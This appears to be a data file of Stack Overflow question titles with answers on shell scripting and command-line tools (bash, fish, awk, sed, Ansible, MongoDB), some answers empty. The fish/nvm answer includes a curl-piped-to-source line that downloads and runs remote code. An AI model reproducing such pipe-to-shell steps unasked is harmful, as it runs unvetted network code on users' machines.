    "Gnome javascript documentation": "To start writing GNOME Shell Extensions, I would recommend you to start looking the Shell Extensions wiki page. There you will find links to tutorials, as well as guidelines.\nWith respect to modules available, you have everything that is available via GObject Instrospection. In order to get familiar with this, you can take a look the explained demos. For API docuementation, you can go to Platform Overview.",
    "How to manage my node version using Fish Shell": "So, I found two ways,\nOne is using nvm with only bash. Whenever you need to use nvm command, use bash. Then go back to fish and do all the node relates stuffs, change nvm use [version] in bash. Then work in fish and still it will use the version NVM sets.\nAnother is, install curl, install fisher, install bass plugin to support bash style in fish,\nsudo apt install curl\ncurl -sL https://git.io/fisher | source && fisher install jorgebucaran/fisher\nfisher install edc/bass\nCreate nvm.fish sudo nano ~/.config/fish/functions/nvm.fish\nAdd this code to the file nvm.fish\nfunction nvm\n    bass source ~/.nvm/nvm.sh --no-use ';' nvm $argv\nend\nNow, you can use nvm command in Fish",
    "Too many open files error while running awk command": "Before starting on the next file, close the previous one:\n    awk '/pattern here/{close(\"file\"i); i++}{print > \"file\"i}' InputFile",
    "adb shell dumpsys meminfo - What is the meaning of each cell of its output?": "",
    "Ansible Playbook to run Shell commands": "You don't even need a playbook to do this :\nRestarting nginx :\nansible your_host -m service -a 'name=nginx state=restarted'\n(see service module)\nKill a process by process id\nansible your_host -m command -a 'kill -TERM your_pid'\n(adjust signal, and use pkill/killall if you need to match a name; see command module)\nHowever, I wouldn't say that ansible shines if you're just using it for ad-hoc commands.\nIf you need a tutorial to get you started with playbooks, there is one over here.\nNow if you can to put these (the official name for service, commands, etc.. are modules) in a playbook (let's call it playbook.yml), you can just :\n- hosts: webappserver\n  tasks:\n    - name: Stops whatever\n      command: kill -TERM your_pid\n      notify:\n        - Restart nginx\n\n    - name: Another task\n      command: echo \"Do whatever you want to\"\n\n  handlers:\n    - name: Restart nginx\n      service: name=nginx state=restarted\nCreate an inventory file (hosts) containing :\n# webappserver should resolve !\nwebappserver\nInvoke with :\nansible playbook.yml -i hosts\nand it should work.\nThis is all very basic and can be grasped easily reading the docs or any tutorial out there.",
    "Invoking SOAP request from shell command": "You need to provide the name of the SOAP action. You have:\n-H \"SOAPAction:\"\nSupply the name of the action in there. E.g.\n-H \"SOAPAction: http://my_example/my_action\"\nGet the name of the action from the WSDL if you have one. E.g., see How do you determine a valid SoapAction?.",
    "Reading with cat: Stop when not receiving data": "There is a timeout(1) command. Example:\ntimeout 5s cat /dev/random\nDependening on your circumstances. E.g. you run bash with -e and care normally for the exit code.\ntimeout 5s cat /dev/random || true",
    "Python on iPhone": "You can browse the packages manually here:\nhttp://apt.saurik.com/cydia/debs/\nThese are the Python related packages:\n- iPhone/Python = Example applications including source\n- PyObjC = Python/Objective-C connection library\n- Python = Packages required to run Python\n- Setup Tools = Package manager for Python modules\nThis guide will get you started running the first script:\nhttp://gentechblog.wordpress.com/2009/10/07/how-to-python-on-the-iphoneipod-touch/\nEspecially: check the developer filter note, this makes the packages show up.\nHere is the introduction to PyObjC by Jay Freeman (including example):\nhttp://www.saurik.com/id/5\nBut you better start with running simple Python scripts!\nResponse to your comment:\nWhy do people keep down voting this? It's an honest question looking for an honest answer!\nPeople on StackOverflow generally don't like requests for 'step-by-step' instructions or request for writing complete snippets of code. The scope of your question is just too wide, you better ask more specific questions. Show what you tried so far and what is causing the exact problem. For example, you show the link with the guide you're following and mention the step that's causing the trouble. If you ask it the right way, people are more then willing to help you. Just show what you tried to fix the problem yourself. I understand your intention is right, I voted you up :)",
    "windows subcommand evaluation": "You can get something similar using a variation of the for command:\nFOR /F \"usebackq tokens=*\" %%a IN (`subcommand`) DO @command %%a\nOne big difference (besides being unintuitive and much uglier) is that it'll execute command once for each line produced by subcommand\nNote that inside a script file, the percent signs must be doubled up (use non-doubled percent signs if you have some reason to want to do this at the command line).",
    "bash script starting new shell and continuing to run commands [duplicate]": "As per the manual :\nshell will spawn a shell with the virtualenv activated.\nwhich is not what you need. Instead use run :\nrun will run a given command from the virtualenv, with any arguments forwarded (e.g. $ pipenv run python).\nIn your case, something like\npipenv run python -m ipykernel install --user --name==new-virtual-env",
    "Running 'export' command with Pythons 'subprocess' does not work": "It works fine; however, the variable setting only exists in the subprocess. You cannot affect the environment of the local process from a child.\nos.environ is the correct solution, as it changes the environment of the local process, and those changes will be inherited by any process started with subprocess.run.\nYou can also use the env argument to run:\nsubprocess.run([\"cmdname\", \"arg1\", \"arg number 2\"], env=dict(FOO='BAR', **os.environ))\nThis runs the command in a modified environment that includes FOO=BAR without modifying the current environment.",
    "Set an environment variable within a shell alias": "Answering your isolated example:\nwhen you do something like this:\nbar=foo my_command\nthen bar is set in my_command's environment (and is not seen by the current shell). Hence, when you do:\nbar=stuff\nbar=foo my_command \"$bar\"\nsince the expansion of $bar occurs before my_command is executed, then it's like doing:\nbar=foo my_command stuff\nsince the $bar is expanded before my_command is forked. That explains the [blank line] you obtain in your example:\n$ alias foo='BAR=baz'\n$ type foo\nfoo is aliased to `BAR=baz'\n$ foo echo $BAR\n[blank line]\nJust for fun, try these:\n$ alias foo=BAR=baz\n$ BAR=something\n$ foo echo \"$BAR\"\nsomething\nmakes sense?\n$ alias foo=BAR=baz\n$ foo eval 'echo \"$BAR\"'\nbaz\nthis is because BAR is passed in eval's environment, and then echo \"$BAR\" is expanded\u2026 with the expected value (note the single quotes!).\nSimilarly,\n$ alias foo=BAR=baz\n$ foo sh -c 'echo \"$BAR\"'\nbaz",
    "How do I install / enable the PHP phar extension?": "",
    "Restoring stdout and stderr to default value": "This example\nExample 20-2. Redirecting stdout using exec\n#!/bin/bash\n# reassign-stdout.sh\n\nLOGFILE=logfile.txt\n\nexec 6>&1           # Link file descriptor #6 with stdout.\n                    # Saves stdout.\n\nexec > $LOGFILE     # stdout replaced with file \"logfile.txt\".\n\n# ----------------------------------------------------------- #\n# All output from commands in this block sent to file $LOGFILE.\n\necho -n \"Logfile: \"\ndate\necho \"-------------------------------------\"\necho\n\necho \"Output of \\\"ls -al\\\" command\"\necho\nls -al\necho; echo\necho \"Output of \\\"df\\\" command\"\necho\ndf\n\n# ----------------------------------------------------------- #\n\nexec 1>&6 6>&-      # Restore stdout and close file descriptor #6.\n\necho\necho \"== stdout now restored to default == \"\necho\nls -al\necho\n\nexit 0\nappears to show what you want. It came from the ABS, where there is a small amount of discussion and other relevant information.",
    "Exporting environment variables to Makefile shell": "Is this what you want?\nVAR2 := $(shell VAR1=\"$(VAR1)\" script_that_uses_var1)",
    "CouchDb: How to delete documents older > 6 month?": "You can write an update function in couchdb that deletes a doc on certain criteria ( you can use params while calling the function) : http://wiki.apache.org/couchdb/Document_Update_Handlers#Creating_an_Update_Handler\n(look at \"in-place\" and imagine setting \"_delete:true\").\nsomething like\n\"deletefunc\":\n...\nif(doc.created_at<req.query.mindate) {\n  doc._deleted:true;\n  return [doc, \"deleted\"]\n}\nand calling ...db/_design/updatefuncdesigndoc/_update/deletefunc/dok_id_x?mindate=20110816\nThe only work is: calling each doc in a database explicit with this function (calling _all_docs or _changes first)",
    "Shell Scripting: Using xargs to execute parallel instances of a shell function": "Here's a demo of how you might be able to get your function to work:\n$ f() { echo \"[$@]\"; }\n$ export -f f\n$ echo -e \"b 1\\nc 2\\nd 3 4\" | xargs -P 0 -n 1 -I{} bash -c f\\ \\{\\}\n[b 1]\n[d 3 4]\n[c 2]\nThe keys to making this work are to export the function so the bash that xargs spawns will see it and to escape the space between the function name and the escaped braces. You should be able to adapt this to work in your situation. You'll need to adjust the arguments for -P and -n (or remove them) to suit your needs.\nYou can probably get rid of the grep and cut. If you're using the Bash builtin time, you can specify an output format using the TIMEFORMAT variable. If you're using GNU /usr/bin/time, you can use the --format argument. Either of these will allow you to drop the -p also.\nYou can replace this part of your wget command: 2>&1 1>/dev/null with -q. In any case, you have those reversed. The correct order would be >/dev/null 2>&1.",
    "How can I execute a shell command using VBA?": "Example:\n retVal = Shell(\"C:\\Temp\\gc.exe 1\", vbNormalFocus)\nLink: Shell Invoked from VBA",
    "Is it possible to execute Shell scripts from Android application": "",
    "How to get InfluxDB measurement size?": "I have a grafana board that shows me 'filestore' bytes from influx internal stats, like so:\nSELECT sum(\"diskBytes\") FROM \"_internal\"..\"tsm1_filestore\" WHERE time >= now() - 6h GROUP BY time(30s), \"database\"\nThis is not the actual size on disk (compared with /var/lib/influxdb/data/), but could give you an indication which database is growing large.\nUpdate:\nThis ensures to have the latest value of each database which is much more accurate.\nSELECT SUM(diskBytes) FROM (\n  SELECT max(diskBytes) AS \"diskBytes\" \n  FROM \"influxdb_tsm1_filestore\" \n  WHERE $timeFilter AND \"database\" != 'annotation'\n  GROUP BY \"database\", \"id\"\n)  GROUP BY time($__interval), \"database\"",
    "Bash error using the column command: 'column: line too long'": "You could try a naive awk implementation:\nawk 'NR==FNR{for(i=1;i<=NF;i++) \n        max[i] = length($i) > max[i] ? length($i) : max[i]; next} \n{ for(i=1;i<=NF;i++) printf \"%-\"max[i]\"s  \", $i; printf \"\\n\"}' text.txt text.txt",
    "Reading python variables during a running job": "Without editing your program, you're going to have a bad time. What you are looking for is some form of remote debugger, but anything that gives you python specific things will probably have to be at least somehow given a hook into your program. That being said, if you feel like fiddling around in a stack, you can attach gdb to your program (gdb -p <PID>) and see what you can find.\nEdit: Well. This might actually be possible.\nFollowing here, with the python extentions for GDB installed, if you pop open a gdb shell with gdb python <PID>, you should be able to run py-print <name of the variable> to get its value, assuming it's in the scope of the program at that point. Attempting to do this myself, with the trivial program\nimport time\na = 10\ntime.sleep(1000)\nI was able to open a GDB shell by finding the PID of the program (ps aux | grep python), running sudo gdb python <PID> and then run py-print a, which produced \"global 'a' = 10\". Of course this assumes you are running in a *nix environment.\nTawling around in the GDB shell for a while, I found you can actually interact with the Python primatives. For example, to get the length of an array:\n(gdb) python-interative\n>>>  frame = Frame.get_selected_python_frame()\n>>>  pyop_frame = frame.get_pyop()\n>>>  var, scope = pyop_frame.get_var_by_name('<variable name>')\n>>>  print(var.field('ob_size'))\nNote the requirement to use the actual internal field names to get things (The actual values of the list can be found with 'ob_item', and then an index).\nYou can dump the array to a file in a similar way:\nlength = int(str(var.field('ob_size'))\noutput = []\nfor i in range(length):\n    output.append(str(var[i]))\nwith open('dump', 'w') as f:\n    f.write(', '.join(output))",
    "Escape dollar sign in regexp for sed": "The correct way to escape a dollar sign in regular expressions for sed is double-backslash. Then, for creating the escaped version in the output, we need some additional slashes:\ncat filenames.txt | sed \"s/\\\\$/\\\\\\\\$/g\" > escaped-filenames.txt\nYep, that's four backslashes in a row. This creates the required changes: a filename like bla$1$2.class would then change to bla\\$1\\$2.class. This I can then insert into the full pipeline:\nfor i in $(diff -r old new 2>/dev/null | grep \"Only in old\" | cut -d \"/\" -f 3- | sed \"s/: /\\//g\" | sed \"s/\\\\$/\\\\\\\\$/g\"; do echo \"rm -f $i\" >> REMOVEOLDFILES.sh; done\nAlternative to solve the background problem\nchepner posted an alternative to solve the backround problem by simply adding single-quotes around the filenames for the output. This way, the $-signs are not read as variables by bash when executing the script and the files are also properly removed:\nfor i in $(diff -r old new 2>/dev/null | grep \"Only in old\" | cut -d \"/\" -f 3- | sed \"s/: /\\//g\"); do echo \"rm -f '$i'\" >> REMOVEOLDFILES.sh; done\n(note the changed echo \"rm -f '$i'\" in that line)",
    "Running shell script with NSTask causes posix_spawn error": "You can also add #!/bin/bash to the start of your script:\n#!/bin/bash\n\nif [ ! -d ~/Remote/username/projects  ] \nthen  \n    sshfs -C -p 22 user@remotecomputer.com:/home/username        ~/Remote/username        \nfi",
    "OSTYPE not available in shell script": "The OSTYPE environment variable is not recognized by the original Bourne shell, which is what is being invoked by the first line of your script.\nReplace it with:\n#!/bin/bash\nor\n#!/bin/ksh\nas appropriate to your setup.",
    "Exit after trap fires": "Do cascading traps. exit 127 will run the EXIT trap and set the exit code to 127, so you can say\n#!/bin/sh\n\nfd () {\n  echo Hello world\n  # No explicit exit here!\n}\n\ntrap fd EXIT\ntrap 'exit 127' INT\nI remember learning this from other people's scripts after struggling with various workarounds to your problem for several years. After that, I have noticed that some tutorials do explain this technique. But it is not documented clearly in e.g. the Bash manual page IMHO. (Or it wasn't when I needed it. Maybe some things don't change in 15 years ... :-)",
    "What does if [ \"x\" != x ] do in bash?": "In Bash, that test is guaranteed to fail; [ \"x\" != x ] always returns a non-zero exit status (i.e. \"false\"), because \"x\" and x are both the string consisting of the single character x. (The quotation marks don't really have any effect in this case.)\nWhat's more, the command PS1=\"$PS1\" doesn't really do anything, either: it just sets the variable PS1 equal to the value it already has.\nI'm guessing that this script is autogenerated in some way, and that on some systems, these statements will look a bit different, and a bit less useless.",
    "Are shell aliases POSIX compliant?": "alias (and unalias) are indeed in POSIX.\nSee also alias substitution and alias names for how they are supposed to be implemented.",
    "Windows 7: Property Handler works in Explorer but Not FileOpenDialog?": "OK, figured it out. Here is the deal. My app is 32 bit and I am on a x64 system. Because the PropertyHandler is written in x64 to support the shell out of process. But for the file open dialog it needs to run inprocess, so the x64 dll can not run. I confirmed this by creating a quick x64 app and the fileopen dialog works the same as the OS. Hope this helps someone else in my shoes later on, hate answering my own question, but don't want people wasting NRG on this one as I found the solution.",
    "Bit mask in Bash": "Bit manipulation is supported in POSIX arithmetic expressions:\nif [ $(( var1 & 0x3 )) -eq $(( 0x2 )) ]; then\nHowever, it's a bit simpler use an arithmetic statement in bash:\nif (( (var1 & 0x3) == 0x2 )); then",
    "Is there a difference between negating before/after a test command?": "To build on chepner's insightful comment on the question:\nIn [ ! condition ], the ! is just an argument to the [ builtin (an effective alias of the test builtin); it so happens that [ / test interprets argument ! as negation.\nIn ! [ condition ], the ! is a shell keyword that negates whatever command it is followed by (which happens to be [ in this case).\nOne thing that the ! [ condition ] syntax implicitly gives you is that negation applies to whatever [ condition ] evaluates to as a whole, so if that is the intent, you needn't worry about operator precedence.\nPerformance-wise, which syntax you choose probably doesn't make much of a difference; quick tests suggest:\nIf condition is literally the same in both cases, passing the ! as an argument to [ is negligibly faster.\nIf ! is used as a keyword, and you are therefore able to simplify the condition by not worrying about precedence, it may be slightly faster (e.g, ! [ 0 -o 1 ] vs. [ ! \\( 0 -o 1 \\) ]; note that the POSIX spec. discourages use of -a and -o due to ambiguity).\nThat said, if we're talking about Bash, then you should consider using [[ instead of [, because [[ is a shell keyword that parses the enclosed expression in a special context that:\noffers more features\nallows you to safely combine expressions with && and ||\ncomes with fewer surprises\nis also slightly faster (though that will rarely matter in pratice)\nSee this answer of mine.",
    "xvfb-run: line 171: kill: (25939) - No such process": "",
    "What's the best way to embed a Unicode character in a POSIX shell script?": "If you have Gnu printf installed (it's in debian package coreutils, for example), then you can use it independent of which shell you are using by avoiding the shell's builtin:\nenv printf '\\u2388\\n'\nHere I am using the Posix-standard env command to avoid the use of the printf builtin, but if you happen to know where printf is you could do this directly by using the complete, path, such as\n/usr/bin/printf '\\u2388\\n'\nIf both your external printf and your shell's builtin printf only implement the Posix standard, you need to work harder. One possibility is to use iconv to translate to UTF-8, but while the Posix standard requires that there be an iconv command, it does not in any way prescribe the way standard encodings are named. I think the following will work on most Posix-compatible platforms, but the number of subshells created might be sufficient to make it less efficient than a \"heavy\" script interpreter:\nprintf $(printf '\\\\%o' $(printf %08x 0x2388 | sed 's/../0x& /g')) |\niconv -f UTF-32BE -t UTF-8\nThe above uses the printf builtin to force the hexadecimal codepoint value to be 8 hex digits long, then sed to rewrite them as 4 hex constants, then printf again to change the hex constants into octal notation and finally another printf to interpret the octal character constants into a four-byte sequence which can be fed into iconv as big-endian UTF-32. (It would be simpler with a printf which recognizes \\x escape codes, but Posix doesn't require that and dash doesn't implement it.)\nYou can use the line without modification to print more than one symbol, as long as you provide the Unicode codepoints (as integer constants) for all of them (example executed in dash):\n$ printf $(printf '\\\\%o' $(printf %08x 0x2388 0x266c 0xA |\n>                          sed 's/../0x& /g')) |\n> iconv -f UTF-32BE -t UTF-8\n\u2388\u266c\n$\nNote: As Geoff Nixon mentions in a comment, the fish shell (which is nowhere close to Posix standard, and as far as I can see has no aspirations to conform) will complain about the unquoted %08x format argument to printf, because it expects words starting with % to be jobspecs. So if you use fish, add quotes to the format argument.",
    "How to cut multiple columns from several files and print the output to different files": "You can write a for...loop:\nfor i in AD*-C.vcf\ndo\n    cut -f 1,2,5 $i > cut${i%-C.vcf}.txt\ndone",
    "OS system calls from bash script": "Many syscalls are accessible, but only via the native shell mechanisms, rather than being able to directly specify exact parameters. For instance:\nexec 4>outfile\ncalls:\nopen(\"outfile\", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3\ndup2(3, 4)\n(with 3 being replaced by the next available descriptor), and\nexec 4<&-\ncalls:\nclose(4)\nSome shells, such as bash, allow additional builtins to be added through loadable modules (see the enable builtin, used to load such modules); if you really needed functionality not provided upstream, you could potentially implement it that way.",
    "What's the difference between *.bat and *.cmd file? [duplicate]": ".bat files are left-overs from DOS. .cmd files are for Window NT command processor or higher, and have more capabilities (some looping structures, the ability to call and return from procedural type blocks).\ncommand.com was what ran the operating system and contained the internal commands like dir in DOS and early versions of Windows. It was replaced by cmd.exe when Windows NT was introduced, and was the first 32-bit command processor.",
    "Cannot understand command substitution in Fish shell": "Update\nThis answer was written ten year ago in 2010. Recent versions of fish (I tested on 3.1.2) updated and set cmd ls; $cmd is valid now.\nHow\nThis because command substitutions belong to parameter expansions and are not allowed as commands.\nA similar example:\nin sh:\ntmpls=ls\n$tmpls\nBut in fish:\n% set cmd ls; $cmd\nfish: Variables may not be used as commands.\n...\nWhy\nIn short, it's good for verifiability\nThis article explains details:\nSince it is allowed to use variables as commands in regular shells, it is impossible to reliably check the syntax of a script. For example, this snippet of bash/zsh code may or may not be legal, depending on your luck. Do you feel lucky?\n    if true; then if [ $RANDOM -lt 1024 ]; then END=fi; else END=true; fi; $END\nBoth bash and zsh try to determine if the command in the current buffer is finished when the user presses the return key, but because of issues like this, they will sometimes fail. Even worse, this piece of perfectly legal code is rejected by bash:\n  FI=fi; foo() { if true; then true; $FI; }\nFish avoids this kind of problem, since variables are not allowed as commands. Anything you can do with variables as commands can be done in a much cleaner way using either the eval command or by using functions.\nFor the same reason, command substitutions are not allowed as commands.\n(Note: The cited example is not fair, since 'if' and 'fi' are not simple commands but reserved words. See comments below.)",
    "What does triple-single-quote mean in bash?": "There is no \u201ctriple quote\u201d ... for example ''' '$Q' ''' is the concatenation of several strings ... '', ' ', $Q, ' ' and ''. Consider each of the others in the same way.",
    "Get Spacemacs/Emacs GUI version to recognize nix-shell environment": "I was able to fix this issue by running space emacs in daemon mode. https://www.emacswiki.org/emacs/EmacsAsDaemon\nin the directory with default.nix: \nnix-shell .\nemacs --daemon\nemacsclient -c -a emacs",
    "\". filename\" can't find file when run from /bin/sh, works from /bin/bash; why?": "From the Manpage:\n. filename [arguments]\nsource filename [arguments] Read and execute commands from filename in the current shell environment and return the exit status of the last command executed from filename. If filename does not contain a slash, file names in PATH are used to find the directory containing filename. The file searched for in PATH need not be executable. When bash is not in posix mode, the current directory is searched if no file is found in PATH. If the sourcepath option to the shopt builtin command is turned off, the PATH is not searched. If any arguments are supplied, they become the positional parameters when filename is executed. Otherwise the positional parameters are unchanged. The return status is the status of the last command exited within the script (0 if no commands are executed), and false if filename is not found or cannot be read.\nSo, it seems that the shebang #!/bin/sh sets your bash to posix mode. In this mode, only PATH is evaluated, not the current directory.",
    "Save Zsh history to ~/.persistent_history": "After so much Googling, I finally found out the way to do this. First, in ~/.zshrc, add the following options for history manipulation:\nsetopt append_history # append rather then overwrite\nsetopt extended_history # save timestamp\nsetopt inc_append_history # add history immediately after typing a command\nIn short, these three options will record every input_time+command to ~/.zsh_history immediately. Then, put this function into ~/.zshrc:\nprecmd() { # This is a function that will be executed before every prompt\n    local date_part=\"$(tail -1 ~/.zsh_history | cut -c 3-12)\"\n    local fmt_date=\"$(date -d @${date_part} +'%Y-%m-%d %H:%M:%S')\"\n    # For older version of command \"date\", comment the last line and uncomment the next line\n    #local fmt_date=\"$(date -j -f '%s' ${date_part} +'%Y-%m-%d %H:%M:%S')\"\n    local command_part=\"$(tail -1 ~/.zsh_history | cut -c 16-)\"\n    if [ \"$command_part\" != \"$PERSISTENT_HISTORY_LAST\" ]\n    then\n        echo \"${fmt_date} | ${command_part}\"  >> ~/.persistent_history\n        export PERSISTENT_HISTORY_LAST=\"$command_part\"\n    fi\n}\nSince I use both bash and zsh, so I want a file that can save all their history commands. In this case, I can easily search all of them using \"grep\".",
    "loop with more than one item at a time": "Assuming you don't have too many items (although the shell should be able to handle quite a few positional arguments.\n# Save the original positional arguments, if you need them\noriginal_pp=( \"$@\" )\nset -- *\nwhile (( $# > 0 )); do\n    i=$1 j=$2 k=$3     # Optional; you can use $1, $2, $3 directly\n    ...\n    shift 3 || shift $#   # In case there are fewer than 3 arguments left\ndone\n\n# Restore positional arguments, if necessary/desired\nset -- \"${original_pp[@]}\"\nFor POSIX compatibility, use [ \"$#\" -gt 0 ] instead of the ((...)) expression. There's no easy way to save and restore all the positional parameters in a POSIX-compatible way. (Unless there is a character you can use to concatenate them unambiguously into a single string.)\nHere is the subshell jm666 mentions:\n(\n    set -- *\n    while [ \"$#\" -gt 0 ]; do\n        i=$1 j=$2 k=$3\n        ...\n        shift 3 || shift $#\n    done\n)\nAny changes to parameters you set inside the subshell will be lost once the subshell exits, but the above code is otherwise POSIX-compatible.",
    "awk's $1 conflicts with $1 in shell script": "A variable is fine too.\nawk -F, -v needle=\"$1\" '$1 ~ needle {print \"is good\"}' < input.csv",
    "Is there any way of stopping _popen opening a dos window?": "As far as I know, you can't1: you are starting a console application (cmd.exe, that will run the specified command), and Windows always creates a console window when starting a console application.\nalthough, you can hide the window after the process started, or even create it hidden if you pass the appropriate flags to CreateProcess; problem is, _popen do not pass these flags, so you have to use the Win32 APIs instead of _popen to create your pipe.",
    "What is the equivalent to xargs -r under OsX": "The POSIX standard for xargs mandates that the command be executed once, even if there are no arguments. This is a nuisance, which is why GNU xargs has the -r option. Unfortunately, neither BSD (MacOS X) nor the other mainstream Unix versions (AIX, HP-UX, Solaris) support it.\nIf it is crucial to you, obtain and install GNU xargs somewhere that your environment will find it, without affecting the system (so don't replace /usr/bin/xargs unless you're a braver man than I am \u2014 but /usr/local/bin/xargs might be OK, or $HOME/bin/xargs, or \u2026).",
    "Tab completion freezes for Git commands only": "I'm assuming you are using RVM or some tool like that.\nThere is a bug in the git-completion.bash shipped with the current git (2.1.3) and older versions, causing an endless loop when listing file completions in directories where RVM is used.\nThe reason for this endless loop is a change of chpwd_functions, made by RVM and some other tools.\nI've found a patch for the git-comletion.bash affecting only the __git_ls_files_helper method which is used for listing files. The patch ignores the chpwd_functions and hence, these endless loops are omitted.\nIn short: The __git_ls_files_helper function needs to be changed from:\n__git_ls_files_helper ()\n{\n  (\n    test -n \"${CDPATH+set}\" && unset CDPATH\n    cd \"$1\"\n    if [ \"$2\" == \"--committable\" ]; then\n      git diff-index --name-only --relative HEAD\n    else\n      # NOTE: $2 is not quoted in order to support multiple options\n      git ls-files --exclude-standard $2\n    fi\n   ) 2>/dev/null\n}\nto:\n__git_ls_files_helper ()\n{\n  (\n    test -n \"${CDPATH+set}\" && unset CDPATH\n    (( ${+functions[chpwd]} )) && unfunction chpwd\n    (( ${#chpwd_functions} )) && chpwd_functions=()\n    setopt chaselinks\n    builtin cd \"$1\" 2>/dev/null\n    if [ \"$2\" == \"--committable\" ]; then\n      git diff-index --name-only --relative HEAD\n    else\n      # NOTE: $2 is not quoted in order to support multiple options\n      git ls-files --exclude-standard $2\n    fi\n  ) 2>/dev/null\n}\nFurther information can be found in the RVM issue discussion on Github. The location of your git-completion.bash depends on how you have installed git. When using Homebrew, the location is something like\n/usr/local/Cellar/git/<git version>/etc/bash_completion.d/\non other systems, or when using other package managers, it usually should be something like\n/opt/local/etc/bash_completion.d\nFor further information about the git-completion.bash, take a look at the Git Tips and Tricks, chapter 2.7 in the git-scm.com book.\nUpdate:\nGit v 2.2.0 has fixed this issue so just upgrade if you're running into this issue.",
    "MongoDB - Not Authorized to Execute Command": "In order to run show dbs command and if the user has access to multiple databases, first the user should be created on the admin database (this is because listDatabases action is a cluster wide operation). Also the user should be given access to this operation. In order to do that, a new role should be created with the action. Below are the steps for the same:\n//login as admin with --authenticationDatabase \"admin\" (assumption is that admin user is with root privileges) and then run the below:\nuse admin;\n\ndb.runCommand({ createRole: \"listDatabases\", privileges: [{ resource: { cluster : true }, actions: [\"listDatabases\"]} ], roles: [] });\n\ndb.createUser({user:\"testUser\", pwd:\"passwd\", roles:[{role:\"read\", db:\"db1\"},{role:\"read\", db:\"db2\"},{ role: \"listDatabases\", db: \"admin\" }]});\n//exit as admin user and login as testUser: note the --authenticationDatabase \"admin\"\nmongo -u \"testUser\" -p --authenticationDatabase \"admin\"\nafter logging in run the command below and it should list all the databases:\nshow dbs;\nThe below will work fine even though user is not given access to admin database:\nuse admin;\nBut then the below will give error:\nshow collections;",
    "A more indepth explaniton of procstats for Android": "",
    "Export all network traffic on a webpage": "There is network monitor at Firefox dev tools. Take a look at mdn page where this feature is explained. It is possible to export HAR information from the Network panel by right-clicking and selecting \"Save all as HAR\". HAR is a network request archive format used by many performance and request analysis tools.\nYou can also use firebug addon which has also his own network monitor and extract data by using the netexport firebug extension.\nFor automated process (that will open the browser, then firebug, then the page and then will export data), you probably need the auto-tool used for testing firefox which is called mozmill",
    "On writing a Linux shell script to safely detach programs from a terminal": "Upon closer investigation, these previously unnoticed facts were revealed:\nBoth scripts 3 and 5 (the setsid variant only) will satisfy all the conditions if a /bin/true is appended to the script.\nThese scripts, as modified in fact 1, will work as well if /bin/true is replaced with for i in {0..9999}; do :; done.\nTherefore we can conclude that:\n(From fact 1)\nMultiple levels of detaching (as in script 5) is unnecessary, and the key is to use the right utility (setsid).\n(From fact 2)\nA suitable delay before bash exit is necessary for the success of the script. (Calling external program /bin/true consumes some time, just like the pure-bash time consumer for i in {0..9999}; do :; done.)\nI have not looked at the source code, but I guess a possible explanation is that bash may exit before setsid finishes configuring the execution environment of the program to run, if an appropriate delay is not applied.\nAnd finally, an optimal solution should be\n#!/bin/bash\nsetsid \"$@\" >& /dev/null &\nsleep 0.01\nEDIT 1:\nThe necessity of a delay has been explained here. Many thanks to @wilx!\nEDIT 2:\n(Thanks to @MateiDavid) we seem to have forgotten to redirect the standard input, and a better way would be:\n#!/bin/bash\nsetsid \"$@\" >& /dev/null < /dev/null &",
    "Running R inside a buffer in Vim": "",
    "configuration file editor in Eclipse [closed]": "There's shelled, a shell editor plugin for Eclipse. Syntax highlighting is quite solid. It even provides mouse-hover docs for commands having a man page.",
    "What are all of the well-known virtual folder GUIDs?": "If i understand you correctly you are looking for the CSIDLs (pre-Vista, include Shlobj.h) or KNOWNFOLDERID (>= Vista, Knownfolders.h).",
    "How to get test command return code in the shell?": "You can use && and || to make these things one-liner. For example, in the following:\nls -l && echo ok\necho ok will run only if the command before && (ls -l) returned 0.\nOn the other hand, in the following:\nls -l || echo 'not ok'\necho 'not ok' will run only if the command before || returned non zero.\nAlso, you can make your if..else block one-liner using ;:\nif ls -l;then echo ok;else echo 'not ok';fi\nBut this may make your code hard to read, so not recommended.",
    "Execute shell command and retrieve stdout in Python [duplicate]": "An easy way is to use sh package. some examples:\nimport sh\nprint(sh.ls(\"/\"))\n\n# same thing as above\nfrom sh import ls\nprint(ls(\"/\"))",
    "How to enable Android adb shell history with up / down keys in under Linux?": "",
    "How to write unit testable bash shell code?": "Unit-testing is for findings bugs in the isolated code. Typical shell code, however, is dominated by interactions with other executables or the operating system. The type of problems that lies in interactions in shell code goes in the direction of, am I calling the right executables in the right order with the arguments in the right order with properly formatted argument values, and are the outputs in the form I expect them to be etc. To test all this, you should not apply unit-testing, but integration testing instead.\nHowever, there is shell code that is suitable for unit-testing. This is, for example, code performing computations within the shell, or string manipulations. I would even consider shell code with calls to certain fundamental function-like tools like basename as suitable for unit-testing (interpreting such tools as being part of the 'standard library' if you like).\nHow to make those code parts in a shell that are suitable for being unit-tested actually testable with unit-testing? One of the most useful approaches in my experience is to separate interactions from computations. That is, try to put the computational parts in separate shell functions to be tested, or extract the interaction dominated parts in separate shell functions. That saves you a lot of mocking effort.",
    "MongoDB shell: printing to console without a trailing newline?": "This is related to my SO question on reading a line from the console. Per @Stennie's comment, it is not possible in the current (2.0.6) version of the Mongo shell.",
    "Responding to Shell prompt from Jupyter Notebook": "The input stream of the temporary bash subshell is not connected to your browser. Sending a command to the jupyter kernel is one-way -- there is no interaction. The bash is no exception here.\nState changes -- like changing the working directory with a 'cd' command -- require special implementation effort: 'magic commands'.",
    "Fast emacs shell-mode?": "Set the variables comint-move-point-for-output and comint-scroll-show-maximum-output to nil. This prevents the buffer from continuously scrolling to the end of the output, which requires frequent redisplays.",
    "packet_write_wait: Connection to xxx.xxx.xxx.xxx: Broken pipe": "",
    "waitpid blocking when it shouldn't": "SIGCHLD is delivered for stopped children. The waitpid() call in the signal handler - which doesn't specify WUNTRACED - blocks forever.\nYou should probably not have the removeFromJobList() processing in two different places. If I had to guess, it sounds like it touches global data structures, and doesn't belong in a signal handler.",
    "Apache Spark shell crashes when trying to start executor on worker": "I note from your logs that akka is using a simple hostname aidan-workstation rather than a fully qualified domain name like aidan-workstation.acme.com\nakka.tcp://spark@aidan-workstation:60456/user/CoarseGrainedScheduler\nakka.tcp://sparkWorker@ubuntu:55553/user/Worker\nFrom this user post it \"may\" be the issue you're having\nI had to set SPARK_MASTER_IP in conf/start-master.sh to hostname -f instead of hostname, since akka seems not to work properly with host names / ip, it requires fully qualified domain names.\nYou can try editing your hosts file to include a faked domain name.",
